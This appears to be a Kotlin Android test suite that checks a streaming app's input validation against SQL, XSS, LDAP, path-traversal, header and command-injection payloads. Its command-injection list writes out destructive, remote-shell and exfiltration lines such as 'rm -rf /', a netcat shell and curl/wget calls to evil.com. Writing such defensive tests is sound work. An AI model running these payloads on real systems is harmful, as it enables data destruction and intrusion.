package com.example.catchmestreaming.security

import android.content.Context
import androidx.test.core.app.ApplicationProvider
import androidx.test.ext.junit.runners.AndroidJUnit4
import com.example.catchmestreaming.data.StreamConfig
import com.example.catchmestreaming.repository.StreamRepository
import com.example.catchmestreaming.security.InputValidator
import com.example.catchmestreaming.security.SecureStorage
import kotlinx.coroutines.test.runTest
import org.junit.After
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith

/**
 * Security penetration tests for injection attacks and security vulnerabilities
 * Tests resistance to common attack vectors and malicious inputs
 */
@RunWith(AndroidJUnit4::class)
class SecurityPenetrationTest {

    private lateinit var context: Context
    private lateinit var inputValidator: InputValidator
    private lateinit var secureStorage: SecureStorage
    private lateinit var streamRepository: StreamRepository

    @Before
    fun setup() {
        context = ApplicationProvider.getApplicationContext()
        inputValidator = InputValidator()
        secureStorage = SecureStorage(context)
        streamRepository = StreamRepository(context)
    }

    @After
    fun tearDown() {
        runTest {
            secureStorage.deleteCredentials()
            streamRepository.cleanup()
        }
    }

    @Test
    fun sqlInjectionAttacks_shouldBeBlocked() {
        val sqlInjectionPayloads = listOf(
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; DELETE FROM credentials; --",
            "admin'; UPDATE users SET password='hacked'; --",
            "' UNION SELECT * FROM sensitive_data --",
            "'; INSERT INTO logs VALUES('malicious'); --",
            "1' OR 1=1 LIMIT 1 OFFSET 0 --",
            "' OR 'x'='x",
            "'; EXEC xp_cmdshell('format c:'); --",
            "' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users)) --"
        )

        sqlInjectionPayloads.forEach { payload ->
            // Test username sanitization
            val sanitizedUsername = inputValidator.sanitizeUsername(payload)
            assertNotEquals("SQL payload should be sanitized", payload, sanitizedUsername)
            assertFalse("Sanitized username should not contain SQL keywords",
                sanitizedUsername.contains("DROP", ignoreCase = true) ||
                sanitizedUsername.contains("DELETE", ignoreCase = true) ||
                sanitizedUsername.contains("UPDATE", ignoreCase = true) ||
                sanitizedUsername.contains("INSERT", ignoreCase = true) ||
                sanitizedUsername.contains("UNION", ignoreCase = true) ||
                sanitizedUsername.contains("SELECT", ignoreCase = true)
            )

            // Test server URL validation
            val urlValidation = inputValidator.validateServerUrl(payload)
            assertFalse("SQL injection in server URL should be rejected", urlValidation.isValid)

            // Test RTSP URL validation
            val rtspValidation = inputValidator.validateRTSPUrl("rtsp://$payload:8554/stream")
            assertFalse("SQL injection in RTSP URL should be rejected", rtspValidation.isValid)

            // Test stream path validation
            val pathValidation = inputValidator.validateStreamPath(payload)
            assertFalse("SQL injection in stream path should be rejected", pathValidation.isValid)
        }
    }

    @Test
    fun crossSiteScriptingAttacks_shouldBeBlocked() {
        val xssPayloads = listOf(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "'\"><script>alert('XSS')</script>",
            "<script>document.cookie='evil=true'</script>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>"
        )

        xssPayloads.forEach { payload ->
            // Test username sanitization
            val sanitizedUsername = inputValidator.sanitizeUsername(payload)
            assertFalse("Username should not contain XSS payload",
                sanitizedUsername.contains("<script", ignoreCase = true) ||
                sanitizedUsername.contains("javascript:", ignoreCase = true) ||
                sanitizedUsername.contains("onerror=", ignoreCase = true) ||
                sanitizedUsername.contains("onload=", ignoreCase = true)
            )

            // Test server URL validation
            val urlValidation = inputValidator.validateServerUrl(payload)
            assertFalse("XSS payload in server URL should be rejected", urlValidation.isValid)

            // Test stream path validation
            val pathValidation = inputValidator.validateStreamPath(payload)
            assertFalse("XSS payload in stream path should be rejected", pathValidation.isValid)
        }
    }

    @Test
    fun commandInjectionAttacks_shouldBeBlocked() {
        val commandInjectionPayloads = listOf(
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& format c:",
            "; shutdown -h now",
            "| nc -l -p 4444 -e /bin/sh",
            "; curl -X POST evil.com/steal",
            "&& del /Q /S C:\\",
            "| wget malicious.com/backdoor.sh",
            "; echo 'pwned' > /tmp/hacked",
            "&& chmod 777 /etc/shadow"
        )

        commandInjectionPayloads.forEach { payload ->
            // Test username sanitization
            val sanitizedUsername = inputValidator.sanitizeUsername(payload)
            assertFalse("Username should not contain command injection",
                sanitizedUsername.contains(";") ||
                sanitizedUsername.contains("|") ||
                sanitizedUsername.contains("&&") ||
                sanitizedUsername.contains("rm ") ||
                sanitizedUsername.contains("cat ") ||
                sanitizedUsername.contains("curl ") ||
                sanitizedUsername.contains("wget ")
            )

            // Test server URL validation
            val urlValidation = inputValidator.validateServerUrl(payload)
            assertFalse("Command injection in server URL should be rejected", urlValidation.isValid)

            // Test stream path validation
            val pathValidation = inputValidator.validateStreamPath(payload)
            assertFalse("Command injection in stream path should be rejected", pathValidation.isValid)
        }
    }

    @Test
    fun pathTraversalAttacks_shouldBeBlocked() {
        val pathTraversalPayloads = listOf(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
            "file:///etc/passwd"
        )

        pathTraversalPayloads.forEach { payload ->
            // Test stream path validation
            val pathValidation = inputValidator.validateStreamPath(payload)
            assertFalse("Path traversal should be rejected", pathValidation.isValid)

            // Test server URL validation
            val urlValidation = inputValidator.validateServerUrl(payload)
            assertFalse("Path traversal in server URL should be rejected", urlValidation.isValid)

            // Test filename sanitization
            val sanitizedFilename = inputValidator.sanitizeFilename(payload)
            assertFalse("Sanitized filename should not contain path traversal",
                sanitizedFilename.contains("../") ||
                sanitizedFilename.contains("..\\") ||
                sanitizedFilename.contains("%2F") ||
                sanitizedFilename.contains("%5C")
            )
        }
    }

    @Test
    fun bufferOverflowAttacks_shouldBeHandled() {
        // Generate extremely long strings to test buffer limits
        val longPayloads = listOf(
            "A".repeat(1000),
            "A".repeat(10000),
            "A".repeat(100000),
            "B".repeat(1048576), // 1MB
        )

        longPayloads.forEach { payload ->
            // Test username length limits
            val sanitizedUsername = inputValidator.sanitizeUsername(payload)
            assertTrue("Username should have reasonable length limit",
                sanitizedUsername.length <= 255) // Reasonable limit

            // Test password validation
            val passwordValidation = inputValidator.validatePassword(payload)
            // Very long passwords should either be rejected or truncated safely
            if (passwordValidation.isValid) {
                assertTrue("Valid password should have reasonable length",
                    payload.length <= 1024) // Reasonable upper limit
            }

            // Test server URL validation
            val urlValidation = inputValidator.validateServerUrl(payload)
            assertFalse("Extremely long server URL should be rejected", urlValidation.isValid)

            // Test stream path validation
            val pathValidation = inputValidator.validateStreamPath(payload)
            assertFalse("Extremely long stream path should be rejected", pathValidation.isValid)
        }
    }

    @Test
    fun unicodeNormalizationAttacks_shouldBeHandled() {
        val unicodeAttacks = listOf(
            "\u0041\u0300", // A with combining grave accent
            "\u00C0", // À precomposed
            "\u202E", // Right-to-left override
            "\uFEFF", // Zero width no-break space
            "\u200B", // Zero width space
            "\u2028", // Line separator
            "\u2029", // Paragraph separator
            "\uD800\uDC00", // Surrogate pair
            "\uFFFF", // Noncharacter
            "test\u0000user" // Null byte injection
        )

        unicodeAttacks.forEach { payload ->
            // Test username sanitization handles unicode properly
            val sanitizedUsername = inputValidator.sanitizeUsername(payload)
            assertFalse("Username should not contain dangerous unicode",
                sanitizedUsername.contains("\u0000") ||
                sanitizedUsername.contains("\u202E") ||
                sanitizedUsername.contains("\uFEFF")
            )

            // Test server URL validation
            val urlValidation = inputValidator.validateServerUrl(payload)
            assertFalse("Unicode attack in server URL should be rejected", urlValidation.isValid)
        }
    }

    @Test
    fun credentialInjectionAttacks_shouldBeBlocked() = runTest {
        val credentialAttacks = listOf(
            "user\nHost: evil.com",
            "user\rSet-Cookie: malicious=true",
            "user\nAuthorization: Bearer stolen_token",
            "user\nX-Forwarded-For: 127.0.0.1",
            "password\nHTTP/1.1 200 OK\nContent-Length: 0\n\n",
            "user@domain.com; wget evil.com/backdoor",
            "user\u0000admin",
            "user\nContent-Type: text/html\n\n<script>alert('XSS')</script>"
        )

        credentialAttacks.forEach { payload ->
            // Attempt to store malicious credentials
            val storeResult = secureStorage.storeCredentials(payload, "password123")
            
            if (storeResult.isSuccess) {
                // If storage succeeds, verify sanitization occurred
                val retrieveResult = secureStorage.retrieveCredentials()
                if (retrieveResult.isSuccess) {
                    val (storedUsername, _) = retrieveResult.getOrThrow()
                    assertFalse("Stored username should not contain injection",
                        storedUsername.contains("\n") ||
                        storedUsername.contains("\r") ||
                        storedUsername.contains("\u0000") ||
                        storedUsername.contains("Host:") ||
                        storedUsername.contains("Authorization:")
                    )
                }
            }
            
            // Clean up
            secureStorage.deleteCredentials()
        }
    }

    @Test
    fun httpHeaderInjectionAttacks_shouldBeBlocked() = runTest {
        val headerInjectionPayloads = listOf(
            "value\r\nX-Injected-Header: malicious",
            "value\nSet-Cookie: evil=true",
            "value\r\nContent-Length: 0\r\n\r\n<script>alert('XSS')</script>",
            "value\nLocation: http://evil.com",
            "value\r\nX-XSS-Protection: 0",
            "value\nContent-Security-Policy: none",
            "value\r\nAccess-Control-Allow-Origin: *"
        )

        headerInjectionPayloads.forEach { payload ->
            // Test in username field
            val sanitizedUsername = inputValidator.sanitizeUsername(payload)
            assertFalse("Username should not contain header injection",
                sanitizedUsername.contains("\r\n") ||
                sanitizedUsername.contains("\n") ||
                sanitizedUsername.contains("Set-Cookie:") ||
                sanitizedUsername.contains("Content-Length:") ||
                sanitizedUsername.contains("Location:")
            )

            // Test in stream configuration
            val streamConfig = StreamConfig.createDefault().copy(
                serverUrl = payload,
                streamPath = payload
            )

            val configResult = streamRepository.updateConfiguration(streamConfig)
            if (configResult.isSuccess) {
                // If accepted, verify sanitization
                val currentConfig = streamRepository.getCurrentConfig()
                currentConfig?.let { config ->
                    assertFalse("Server URL should not contain header injection",
                        config.serverUrl.contains("\r\n") ||
                        config.serverUrl.contains("\n")
                    )
                    assertFalse("Stream path should not contain header injection",
                        config.streamPath.contains("\r\n") ||
                        config.streamPath.contains("\n")
                    )
                }
            }
        }
    }

    @Test
    fun ldapInjectionAttacks_shouldBeBlocked() {
        val ldapInjectionPayloads = listOf(
            "*)(objectClass=*",
            "user)(|(password=*))",
            "user*",
            "user)(cn=*))((cn=*",
            "user))(|(objectClass=*",
            "*))%00",
            "user\\2a)(objectClass=*",
            "user)(!(&(objectClass=user)))"
        )

        ldapInjectionPayloads.forEach { payload ->
            // Test username sanitization
            val sanitizedUsername = inputValidator.sanitizeUsername(payload)
            assertFalse("Username should not contain LDAP injection",
                sanitizedUsername.contains(")(") ||
                sanitizedUsername.contains("|(") ||
                sanitizedUsername.contains("objectClass") ||
                sanitizedUsername.contains("\\2a") ||
                sanitizedUsername.contains("%00")
            )

            // Test password validation
            val passwordValidation = inputValidator.validatePassword(payload)
            if (passwordValidation.isValid) {
                assertFalse("Valid password should not contain LDAP injection markers",
                    payload.contains(")(") ||
                    payload.contains("|(") ||
                    payload.contains("objectClass")
                )
            }
        }
    }

    @Test
    fun timingAttacks_shouldBeResistant() = runTest {
        val validUsername = "validuser"
        val validPassword = "validpassword123"
        val invalidUsername = "invaliduser"
        val invalidPassword = "invalidpassword"

        // Store valid credentials
        secureStorage.storeCredentials(validUsername, validPassword)

        // Measure timing for valid vs invalid credential retrieval
        val validTimings = mutableListOf<Long>()
        val invalidTimings = mutableListOf<Long>()

        repeat(10) {
            // Time valid credential access
            val validStart = System.nanoTime()
            val validResult = secureStorage.retrieveCredentials()
            val validEnd = System.nanoTime()
            validTimings.add(validEnd - validStart)

            // Delete and time invalid access
            secureStorage.deleteCredentials()
            val invalidStart = System.nanoTime()
            val invalidResult = secureStorage.retrieveCredentials()
            val invalidEnd = System.nanoTime()
            invalidTimings.add(invalidEnd - invalidStart)

            // Restore valid credentials for next iteration
            secureStorage.storeCredentials(validUsername, validPassword)
        }

        // Calculate average timings
        val avgValidTime = validTimings.average()
        val avgInvalidTime = invalidTimings.average()

        // Timing difference should not be excessive (timing attack resistant)
        val timingRatio = if (avgInvalidTime > avgValidTime) {
            avgInvalidTime / avgValidTime
        } else {
            avgValidTime / avgInvalidTime
        }

        assertTrue("Timing difference should not reveal credential validity (ratio: $timingRatio)",
            timingRatio < 10.0) // Allow some variance but not massive differences
    }

    @Test
    fun raceConditionAttacks_shouldBeHandled() = runTest {
        // Test concurrent access to security-critical operations
        val credentials = listOf(
            "user1" to "pass1",
            "user2" to "pass2",
            "user3" to "pass3"
        )

        // Simulate concurrent credential storage/retrieval
        val results = credentials.map { (username, password) ->
            // Store credentials concurrently
            val storeResult = secureStorage.storeCredentials(username, password)
            
            // Immediately try to retrieve
            val retrieveResult = secureStorage.retrieveCredentials()
            
            storeResult.isSuccess to retrieveResult.isSuccess
        }

        // At least some operations should succeed
        val successfulStores = results.count { it.first }
        val successfulRetrieves = results.count { it.second }

        assertTrue("Some credential stores should succeed under concurrent access",
            successfulStores > 0)

        // System should maintain consistency (no partial/corrupted states)
        val finalRetrieveResult = secureStorage.retrieveCredentials()
        if (finalRetrieveResult.isSuccess) {
            val (finalUsername, finalPassword) = finalRetrieveResult.getOrThrow()
            assertNotNull("Final username should not be null", finalUsername)
            assertNotNull("Final password should not be null", finalPassword)
            assertTrue("Final username should not be empty", finalUsername.isNotEmpty())
            assertTrue("Final password should not be empty", finalPassword.isNotEmpty())
        }
    }
}